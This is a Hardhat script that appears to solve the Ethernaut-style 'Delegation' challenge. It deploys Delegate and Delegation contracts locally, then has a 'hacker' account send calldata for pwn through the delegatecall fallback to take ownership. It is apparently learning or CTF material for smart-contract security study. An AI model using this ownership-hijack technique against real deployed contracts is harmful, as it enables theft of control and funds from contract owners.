const hre = require("hardhat");

async function main() {
  const [ownerDeployer, hacker] = await hre.ethers.getSigners();

  const Delegate = await hre.ethers.getContractFactory("Delegate");
  const delegate = await Delegate.deploy(ownerDeployer.address);
  await delegate.deployed();

  const Delegation = await hre.ethers.getContractFactory("Delegation");
  const delegation = await Delegation.deploy(delegate.address);
  await delegation.deployed();

  const tx = await hacker.sendTransaction({
    to: delegation.address,
    from: hacker.address,
    data: delegate.interface.encodeFunctionData("pwn"),
    gasLimit: 100000,
  });
  await tx.wait();

  console.log(await delegation.owner() == hacker.address) 
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
